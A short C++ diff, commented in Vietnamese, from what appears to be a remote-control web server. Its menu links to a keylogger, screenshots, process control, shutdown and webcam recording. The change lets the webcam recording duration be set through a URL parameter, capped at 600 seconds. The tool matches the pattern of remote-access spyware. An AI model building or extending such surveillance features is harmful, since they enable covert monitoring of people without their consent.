@@ -96,7 +96,7 @@ int main() {
                                      "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
                                      "<li><a href='/keylogger'>Keylogger</a></li>"
                                      "<li><a href='/screenshot'>Screenshot</a></li>"
-                                     "<li><a href='/webcam_rec'>Record webcam 10s</a></li>"
+                                     "<li><a href='/webcam_rec'>Record webcam</a></li>"
                                      "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
                                      "<li><a href='/restart'>Restart</a> (admin)</li>"
                                      "</ul>");
@@ -131,9 +131,36 @@ int main() {
                 response = html_page("<h1>Screenshot Saved</h1><p>File: " + file + "</p>");
             } 
             else if (route == "/webcam_rec") {
-                // Gọi hàm từ webcam.h
-                std::string file = start_webcam_recording();
-                response = html_page("<h1>Recording Started</h1><p>Saving to: " + file + "</p>");
+                // 1. Mặc định là 10 giây
+                int duration = 10; 
+                
+                // 2. Lấy tham số từ URL
+                if (query.count("time")) {
+                    try {
+                        duration = std::stoi(query["time"]);
+                    } catch (...) {
+                        duration = 10; // Lỗi định dạng thì về mặc định
+                    }
+                }
+
+                // === 3. KIỂM TRA GIỚI HẠN (AN TOÀN) ===
+                if (duration < 1) {
+                    duration = 1;      // Tối thiểu 1 giây
+                }
+                if (duration > 600) { 
+                    duration = 600;    // Tối đa 600 giây (10 phút)
+                }
+                // ======================================
+
+                std::cout << "DEBUG: Quay video trong " << duration << " giay.\n";
+
+                // 4. Gọi hàm quay video
+                std::string file = start_webcam_recording(duration);
+                
+                // 5. Phản hồi HTML
+                response = html_page("<h1>Recording Started</h1>"
+                                     "<p>Duration: " + std::to_string(duration) + " seconds</p>"
+                                     "<p>File saved to: " + file + "</p>");
             }
             // --- LOGIC CHO SHUTDOWN/RESTART ---
             else if (route == "/shutdown") {
